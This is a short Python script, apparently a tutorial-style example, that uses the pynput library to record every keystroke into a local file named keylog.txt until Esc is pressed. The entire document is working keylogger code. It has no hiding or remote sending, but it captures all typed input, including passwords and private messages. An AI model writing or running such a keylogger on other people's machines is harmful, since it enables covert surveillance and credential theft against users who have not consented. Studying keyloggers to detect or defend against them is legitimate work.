# Import the keyboard module from pynput
from pynput import keyboard

# Define the log file where keystrokes will be saved
log_file = "keylog.txt"

# Function to write keystrokes to the log file
def on_press(key):
    # Open the log file in append mode
    with open(log_file, "a") as f:
        try:
            # Write the character of the key pressed
            f.write(f"{key.char}")
        except AttributeError:
            # Write the special key (e.g., space, enter)
            f.write(f"{key}")

# Function to handle key release (optional)
def on_release(key):
    # If the Esc key is pressed, stop the listener
    if key == keyboard.Key.esc:
        return False

# Set up the listener to monitor keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Join the listener thread to the main thread to keep it running
    listener.join()             
